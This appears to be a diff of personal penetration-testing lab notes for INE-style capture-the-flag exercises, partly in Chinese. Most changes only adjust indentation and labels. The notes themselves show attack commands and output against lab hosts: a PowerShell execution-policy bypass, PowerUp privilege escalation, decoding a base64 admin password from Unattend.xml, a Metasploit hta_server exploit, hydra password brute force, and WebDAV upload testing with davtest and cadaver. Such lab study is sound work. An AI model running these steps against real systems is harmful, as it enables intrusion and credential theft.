@@ -212,10 +212,10 @@
 	PS > whoami
 		cd .\Desktop\PowerSploit\Privesc\
 		ls
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	powershell -ep bypass (PowerShell execution policy bypass)
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	. .\PowerUp.ps1
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		powershell -ep bypass (PowerShell execution policy bypass)
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		. .\PowerUp.ps1
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Invoke-PrivescAudit
 		UnattendPath : C:\Windows\Panther\Unattend.xml
@@ -226,15 +226,15 @@
 			            <Value>QWRtaW5AMTIz</Value>
 			            <PlainText>false</PlainText>
 		</Password>
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	$password='QWRtaW5AMTIz'
-	$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
-	echo $password
-	Admin@123
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		$password='QWRtaW5AMTIz'
+		$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
+		echo $password
+		Admin@123
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	runas.exe /user:administrator cmd
-	Admin@123
-	C:\Windows\system32>whoami
+		Admin@123
+		C:\Windows\system32>whoami
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	kali : msfconsole -q
 		use exploit/windows/misc/hta_server
@@ -288,12 +288,13 @@
 ## Host & Network Penetration Testing: System-Host Based Attacks CTF 1
 	=> 利用未修補的軟體漏洞、錯誤配置、弱密碼和惡意軟體感染。
 	=> 嘗試取得 root 或管理員權限來操縱或竊取敏感資料、安裝後門或導致系統崩潰
+ 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sC -sV target1.ine.local
 		80/tcp   open  http          Microsoft IIS httpd 10.0
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	password : /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
-	target1.ine.local
-	target2.ine.local
+	Password : /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+	Domain : target1.ine.local
+	Domain : target2.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get /
 		[80][http-get] host: target1.ine.local   login: bob   password: password_123321
@@ -302,7 +303,8 @@
 		==> DIRECTORY: http://target1.ine.localaspnet_client/ 
 		==> DIRECTORY: http://target1.ine.local/webdav/     
 		==> DIRECTORY: http://target1.ine.local/aspnet_client/system_web/   
-	davtest -auth bob:password_123321 -url http://target1.ine.local/webdav/ 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 	davtest -auth bob:password_123321 -url http://target1.ine.local/webdav/ 
 		SUCCEED : html, shtml,txt,asp,aspx
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
 	cadaver http://target1.ine.local/webdav
